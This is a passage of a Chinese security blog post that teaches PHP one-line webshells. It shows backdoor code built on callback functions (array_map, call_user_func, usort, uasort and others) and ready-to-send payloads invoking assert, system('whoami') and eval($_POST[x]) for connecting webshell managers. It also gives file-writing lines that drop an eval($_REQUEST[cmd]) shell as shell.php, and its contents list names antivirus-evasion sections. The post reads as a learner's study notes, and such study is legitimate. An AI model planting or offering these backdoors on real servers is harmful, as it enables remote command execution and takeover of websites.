+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//执行结果</span></span><br><span class="line">执行结果：</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">5</span>)</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">int</span> <span class="number">4</span></span><br><span class="line"><span class="number">2</span> =&gt; <span class="keyword">int</span> <span class="number">6</span></span><br><span class="line"><span class="number">3</span> =&gt; <span class="keyword">int</span> <span class="number">8</span></span><br><span class="line"><span class="number">4</span> =&gt; <span class="keyword">int</span> <span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>==利用方法==</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @array_map($_REQUEST[<span class="string">&#x27;a&#x27;</span>],(<span class="keyword">array</span>)($_REQUEST[<span class="string">&#x27;b&#x27;</span>])); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>a参数直接传入一个assert函数，b参数传入assert(eval(‘执行代码’))。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=assert&amp;b=phpinfo();</span><br><span class="line">?a=assert&amp;b=system(%<span class="number">27</span>whoami%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( <span class="keyword">callable</span> $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
+<p>示范</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">barber</span>(<span class="params">$type</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You wanted a <span class="subst">$type</span> haircut, no problem\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&quot;mushroom&quot;</span>);</span><br><span class="line">call_user_func(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&quot;shave&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You wanted a mushroom haircut, no problem</span><br><span class="line">You wanted a shave haircut, no problem</span><br></pre></td></tr></table></figure>
+
+<p>一句话木马的利用原理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    call_user_func(<span class="string">&#x27;shell&#x27;</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><blockquote>
+<p>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system($a);</span><br><span class="line">    &#125;</span><br><span class="line">    $cmd = <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">    call_user_func_array(<span class="string">&#x27;shell&#x27;</span>,$cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与上面类似，只不过这次需要将，第二个参数转换为数组形式。</p>
+<h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>依次将 array 数组中的每个值传递到 callback 函数。如果 callback 函数返回 true，则 array 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">odd</span>(<span class="params">$var</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// returns whether the input integer is odd</span></span><br><span class="line">    <span class="keyword">return</span>($var &amp; <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">even</span>(<span class="params">$var</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// returns whether the input integer is even</span></span><br><span class="line">    <span class="keyword">return</span>(!($var &amp; <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$array1 = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">1</span>, <span class="string">&quot;b&quot;</span>=&gt;<span class="number">2</span>, <span class="string">&quot;c&quot;</span>=&gt;<span class="number">3</span>, <span class="string">&quot;d&quot;</span>=&gt;<span class="number">4</span>, <span class="string">&quot;e&quot;</span>=&gt;<span class="number">5</span>);</span><br><span class="line">$array2 = <span class="keyword">array</span>(<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Odd :\n&quot;</span>;</span><br><span class="line">print_r(array_filter($array1, <span class="string">&quot;odd&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Even:\n&quot;</span>;</span><br><span class="line">print_r(array_filter($array2, <span class="string">&quot;even&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里简单说一下定义的<code>odd</code>和 <code>even</code>函数，用来判断是奇数还是偶数</p>
+<p><code>&amp;</code> 按位与 ，把每个输入的数都转化为二进制数据，有且仅当每一位都是<code>1</code>的时候，结果才是<code>1</code>;</p>
+<p>如果是奇数的话，和<code>1</code>做<code>按位与&amp;</code>的运算，结果只会是<code>1</code>,如果结果不为1，结果只能是<code>偶数</code></p>
+<p>所以，懂我意思了吧.</p>
+</blockquote>
+<p>一句话木马的利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $cmd=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    $arr1=<span class="keyword">array</span>($cmd);</span><br><span class="line">    $shell =<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    array_filter($array1,$shell);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>和上面的<code>call_user_func</code>恰恰相反，前面传值，后面传表达式。</p>
+<h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h2><p>sort — 使用用户自定义的比较函数对数组中的值进行排序</p>
+<p>虽然网上有好多个版本的，但由于本人比较菜，，没有复现出来，这里只说一个我复现出来的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> usort($_GET,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>改进后，使用payload <code>?1=phpinfo();&amp;2=eval($_POST[x])</code></p>
+<p>这里把<code>assert</code>加载了<code>usort</code>数组里面,于是省略掉了<code>assert</code></p>
+<p>其实传递参数<code>?1=</code>就可以执行<code>shell</code>，加入<code>2=eval($_POST[])</code>是为了方便连接<code>菜刀，蚁剑之类的工具</code>.</p>
+<hr>
+<p>没有改进前是这样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> usort(...$_GET);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这时候的payload是<code>1[]=1phpinfo();&amp;1[]=eval($_POST[&#39;x&#39;])&amp;2=assert</code></p>
+<p>感兴趣的可以自己复现一下。</p>
+<hr>
+<h2 id="uasort"><a href="#uasort" class="headerlink" title="uasort"></a>uasort</h2><p>原理同上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$a = $_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">	$onearray = <span class="keyword">array</span>(<span class="string">&#x27;Ameng&#x27;</span>, $_POST[<span class="string">&#x27;x&#x27;</span>]);</span><br><span class="line">	uasort($onearray, $a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+<p>payload=get<code>?a=assert</code></p>
+<p>​                post:<code>x=phpinfo();</code></p>
+<h2 id="file-put-contents-与fputs"><a href="#file-put-contents-与fputs" class="headerlink" title="file_put_contents()与fputs()"></a>file_put_contents()与fputs()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="string">&#x27;&lt;?php eval($_REQUEST[cmd])?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ma = <span class="string">&#x27;&lt;?php eval($_REQUEST[cmd]);?&gt;&#x27;</span>;<span class="comment">#这里一定要使用单引号双引号会把$_REQUEST[]当作变量使用</span></span><br><span class="line">file_put_contents(<span class="string">&#x27;muma.php&#x27;</span>, $ma);</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><ul>
+<li>system()</li>
+<li>passthru()</li>
+<li>exec()</li>
+<li>shell_exec()</li>
+<li>反引号``, 如:==print(`whoami`)==</li>
+</ul>
+<p>也可以参考这篇文章<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/heetian.html">https://www.cnblogs.com/hetianlab/p/heetian.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.icode9.com/content-4-751477.html">https://www.icode9.com/content-4-751477.html</a></p>
+<h1 id="script中的知识点"><a href="#script中的知识点" class="headerlink" title="script中的知识点"></a>script中的知识点</h1><h2 id="Windows对象"><a href="#Windows对象" class="headerlink" title="Windows对象"></a>Windows对象</h2><h3 id="弹窗"><a href="#弹窗" class="headerlink" title="弹窗"></a>弹窗</h3><ul>
+<li>alert：只弹出一个用于确定的对话框</li>
+<li>confirm：弹出一个用于确认和取消的对话框，确认返回 true,取消返回false</li>
+<li>prompt：弹出一个可以提示用户输入的对话框。</li>
+</ul>
+<h3 id="执行脚本的函数"><a href="#执行脚本的函数" class="headerlink" title="执行脚本的函数"></a>执行脚本的函数</h3><ul>
+<li>eval</li>
+<li>setTimeout(“脚本”,时间(毫秒))</li>
+<li>setInterval(“脚本”，时间(毫秒))</li>
+<li>setAttribute(“某属性”，“属性的值”)</li>
+<li>removeAttribute (作用于上面相反)</li>
+</ul>
+<p>这些都可以成为执行命令的函数</p>
+<h1 id="响应式布局"><a href="#响应式布局" class="headerlink" title="响应式布局"></a>响应式布局</h1><p> 同一套页面可以兼容不同分辨率的设备</p>
+<ul>
+<li><p>实现: 依赖于栅格系统</p>
+</li>
+<li><p>步骤:</p>
+<ul>
+<li><p>定义容器，相当于之前的table</p>
+<ul>
+<li>容器分类：<ul>
+<li>container</li>
+<li>container-fluid</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>定义行，相当于之前的tr</p>
+</li>
+<li><p>定义元素，指定该元素在不同的设备上，所在的各自的数目</p>
+<p><strong>样式: col - 设备代号 - 各自数目</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<p>大家可以参考这篇学习：<a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2021/03/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">https://h0ld1rs.github.io/2021/03/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/%E5%9B%BE%E5%BA%93/25.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/30/%E9%9D%A2%E8%AF%95%E9%A2%98/%E6%98%9F%E6%BE%9C%E7%A7%91%E6%8A%80%E9%9D%A2%E8%AF%95%E9%A2%98/"><img class="prev-cover" src="/img/%E5%9B%BE%E5%BA%93/26.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">星澜科技面试题</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/23/%E9%9D%A2%E8%AF%95%E9%A2%98/%E9%9D%92%E8%97%A4%E4%BA%91hw%E9%9D%A2%E8%AF%95%E9%A2%98/"><img class="next-cover" src="/img/%E5%9B%BE%E5%BA%93/24.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">青藤云hw面试题</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">一句话木马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.</span> <span class="toc-text">利用条件[文件上传]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.3.</span> <span class="toc-text">常见的一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A"><span class="toc-number">1.4.</span> <span class="toc-text">详细解释</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%BC%BA%E7%89%88%E4%BE%8B%E5%AD%90"><span class="toc-number">1.5.</span> <span class="toc-text">加强版例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.</span> <span class="toc-text">一句话木马的工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8F%98%E5%BD%A2"><span class="toc-number">1.7.</span> <span class="toc-text">一句话木马的变形</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.7.1.</span> <span class="toc-text">图片马[文件上传+文件包含]</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80-%E7%AE%80%E5%8D%95%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">木马免杀(简单思路)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86%E6%9C%A8%E9%A9%AC%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.</span> <span class="toc-text">将木马进行二次编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8D%E6%96%AD%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.2.</span> <span class="toc-text">字符串不断拼接</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%A7%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">大马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">后门执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval"><span class="toc-number">4.1.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#assert"><span class="toc-number">4.2.</span> <span class="toc-text">assert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace"><span class="toc-number">4.3.</span> <span class="toc-text">preg_replace()</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8"><span class="toc-number">4.3.1.</span> <span class="toc-text">实际使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">${phpinfo()}</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#create-function"><span class="toc-number">5.1.</span> <span class="toc-text">create_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-map"><span class="toc-number">5.2.</span> <span class="toc-text">array_map</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func"><span class="toc-number">5.3.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">5.4.</span> <span class="toc-text">call_user_func_array()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#array-filter"><span class="toc-number">5.5.</span> <span class="toc-text">array_filter()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usort"><span class="toc-number">5.6.</span> <span class="toc-text">usort()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uasort"><span class="toc-number">5.7.</span> <span class="toc-text">uasort</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents-%E4%B8%8Efputs"><span class="toc-number">5.8.</span> <span class="toc-text">file_put_contents()与fputs()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">5.9.</span> <span class="toc-text">命令执行函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#script%E4%B8%AD%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">script中的知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.1.</span> <span class="toc-text">Windows对象</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B9%E7%AA%97"><span class="toc-number">6.1.1.</span> <span class="toc-text">弹窗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">6.1.2.</span> <span class="toc-text">执行脚本的函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E5%BC%8F%E5%B8%83%E5%B1%80"><span class="toc-number">7.</span> <span class="toc-text">响应式布局</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2021/07/31/hello-world/" title="Hello World">Hello World</a><time datetime="2021-07-31T14:18:47.559Z" title="发表于 2021-07-31 22:18:47">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="三种xss的区别"/></a><div class="content"><a class="title" href="/2021/07/31/XSS/%E4%B8%89%E7%A7%8Dxss%E7%9A%84%E5%8C%BA%E5%88%AB/" title="三种xss的区别">三种xss的区别</a><time datetime="2021-07-31T13:23:29.000Z" title="发表于 2021-07-31 21:23:29">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie"><img src="/img/image/1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cookie"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/Cookie/" title="Cookie">Cookie</a><time datetime="2021-07-31T13:22:32.000Z" title="发表于 2021-07-31 21:22:32">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译"><img src="/img/image/19.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="预编译"/></a><div class="content"><a class="title" href="/2021/07/31/SQL%E6%B3%A8%E5%85%A5/%E9%A2%84%E7%BC%96%E8%AF%91/" title="预编译">预编译</a><time datetime="2021-07-31T13:19:28.000Z" title="发表于 2021-07-31 21:19:28">2021-07-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP"><img src="/img/image/%20.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="LDAP"/></a><div class="content"><a class="title" href="/2021/07/31/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/LDAP/" title="LDAP">LDAP</a><time datetime="2021-07-31T13:17:25.000Z" title="发表于 2021-07-31 21:17:25">2021-07-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/25.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By h0ld1rs</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: 'VW87gUH9lGz0MqQ26R0dxvzS-gzGzoHsz',
+      appKey: 'hXDx5AOht2WentElxJRM8xnK',
+      placeholder: '来啊，快活啊!',
+      avatar: 'monsterid',
+      meta: 'nick'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
